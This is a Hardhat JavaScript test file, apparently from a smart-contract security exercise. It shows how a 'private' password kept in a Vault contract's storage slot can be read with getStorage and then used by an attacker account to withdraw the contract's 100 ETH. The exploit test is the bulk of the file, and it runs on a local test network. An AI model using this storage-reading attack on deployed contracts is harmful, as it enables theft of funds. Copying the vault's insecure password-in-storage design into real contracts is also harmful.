const { expect } = require("chai");
const { ethers } = require("hardhat");
const { int } = require("hardhat/internal/core/params/argumentTypes");

describe("Vault", function () {
  let deployer, attacker;

  beforeEach(async function () {
    [deployer,attacker] = await ethers.getSigners();
    const Vault = await ethers.getContractFactory("Vault",deployer);
    this.vault = await Vault.deploy(ethers.encodeBytes32String("myPassword"),deployer);
    await this.vault.deposit({ value: ethers.parseEther("100") });
  });

   it("Should return the owner of the vault", async function () {
     expect(await this.vault.owner()).to.equal(deployer.address);
   });
   it("Should be able to retreive private state variables", async function() {
    const initialBalanceContract = await ethers.provider.getBalance(this.vault.getAddress());

    const initialBalanceAttacker = await ethers.provider.getBalance(attacker.address);

    console.log("Contract Initital balance: ", ethers.formatEther(initialBalanceContract.toString()));
    console.log("Attacker Initital balance: ", ethers.formatEther(initialBalanceAttacker.toString()));

    const pwd = await ethers.provider.getStorage(this.vault.getAddress(), 1);
    const myPassword = await ethers.decodeBytes32String(pwd);
     
    console.log("==============");
    console.log("Password id: ",myPassword);
    console.log("==============");

    await this.vault.connect(attacker).withdraw(pwd);

    const finalBalanceContract = await ethers.provider.getBalance(this.vault.getAddress());
    const finalBalanceAttacker = await ethers.provider.getBalance(attacker.address);

    console.log("contract final balance", ethers.formatEther(finalBalanceContract.toString()));
    console.log("contract final attacker", ethers.formatEther(finalBalanceAttacker.toString()));
   })

});
